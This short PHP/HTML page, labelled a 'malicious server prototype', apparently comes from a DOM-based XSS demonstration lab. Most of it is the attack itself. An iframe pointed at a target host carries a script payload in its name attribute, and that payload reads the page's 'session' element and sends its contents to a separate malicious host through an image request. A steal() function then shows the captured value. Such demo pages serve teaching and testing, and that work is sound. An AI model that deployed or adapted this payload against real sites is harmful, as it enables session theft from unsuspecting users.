<?php
include('../declare.php');
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Malicious server prototype: DOM-based XSS</title>
<script type="text/javascript">
function steal(id) {
  var iframe = document.getElementById('embedder');
  var data = iframe.name;
  var stolen = document.getElementById('stolen');
  stolen.textContent = "Stolen value: " + data;
}
</script>
</head>
<body>
<h1>DOM-based XSS</h1>
<iframe id="embedder" name="dummy<script>var d=document;var e=d.getElementById('session');var i=d.createElement('img');i.src='<?=MALHOST?>images/attack.png?'+encodeURI(e.textContent);e.appendChild(i);</script>" width="400" height="400" src="<?=TGTHOST?>dombased/target"></iframe>
<p id="stolen"></p>
</body>
</html>

